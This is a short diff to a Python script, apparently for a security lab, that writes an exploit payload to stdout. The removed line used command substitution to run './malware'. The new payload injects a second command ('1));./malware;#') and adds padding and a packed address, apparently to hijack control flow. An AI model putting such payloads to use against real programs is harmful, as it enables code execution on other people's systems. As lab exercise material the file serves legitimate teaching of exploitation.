@@ -5,6 +5,10 @@ TODO: replace the empty payload with the bytes required by the lab.
 """
 import sys
 
-payload = b"$(./malware)\n"
+payload = (
+    b"1));./malware;#" +
+    b"A" * 9 +
+    b"\xd1\x1a\x40\x00\x00\x00\x00\x00"
+)
 
 sys.stdout.buffer.write(payload)
